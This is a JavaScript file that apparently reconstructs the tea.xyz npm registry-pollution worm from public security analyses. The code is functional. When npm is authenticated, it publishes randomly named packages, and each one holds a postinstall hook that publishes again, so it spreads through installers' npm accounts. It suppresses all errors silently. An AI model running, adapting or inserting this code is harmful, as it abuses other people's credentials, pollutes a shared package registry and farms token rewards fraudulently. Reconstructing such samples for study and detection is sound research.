// registry-pollution — reconstructed from public security analyses
// Source: ossf/malicious-packages MAL-2025-67014 (tea.xyz campaign)
//
// Auto-publish worm that generates and publishes derivative npm packages
// with randomized names to pollute the registry and farm tea.xyz token
// rewards. Modifies package.json to remove private flags.
//
// Technique: Registry pollution worm + npm auto-publish + reputation farming

const fs = require("fs");
const path = require("path");
const os = require("os");
const { execSync } = require("child_process");
const crypto = require("crypto");

// Word lists for generating package names
var prefixes = ["super", "ultra", "mega", "turbo", "hyper", "fast", "quick", "smart"];
var nouns = ["helper", "utils", "tools", "core", "base", "lib", "kit", "hub"];

function randomName() {
  var prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
  var noun = nouns[Math.floor(Math.random() * nouns.length)];
  var suffix = crypto.randomBytes(3).toString("hex");
  return prefix + "-" + noun + "-" + suffix;
}

// Generate and publish a derivative package
function publishDerivative() {
  var name = randomName();
  var tmpDir = path.join(os.tmpdir(), "npm-" + name);

  try {
    fs.mkdirSync(tmpDir, { recursive: true });

    // Create package.json (ensure not private, add tea.yml reference)
    var pkg = {
      name: name,
      version: "1.0.0",
      description: "Utility package for " + name,
      main: "index.js",
      scripts: {
        postinstall: "node index.js"
      }
    };
    fs.writeFileSync(path.join(tmpDir, "package.json"), JSON.stringify(pkg, null, 2));

    // Create index.js that recursively publishes more packages
    var indexContent = [
      "const { execSync } = require('child_process');",
      "try {",
      "  execSync('npm whoami', { encoding: 'utf8' });",
      "  // If authenticated, continue propagation",
      "  execSync('npm publish --access public', { cwd: __dirname });",
      "} catch(e) {}",
    ].join("\n");
    fs.writeFileSync(path.join(tmpDir, "index.js"), indexContent);

    // Attempt to publish
    execSync("npm publish --access public", { cwd: tmpDir, timeout: 30000 });
  } catch(e) {}

  // Cleanup
  try {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  } catch(e) {}
}

// Check if we have npm auth
try {
  var whoami = execSync("npm whoami", { encoding: "utf8" }).trim();
  if (whoami) {
    // Publish 5 derivative packages
    for (var i = 0; i < 5; i++) {
      publishDerivative();
    }
  }
} catch(e) {}
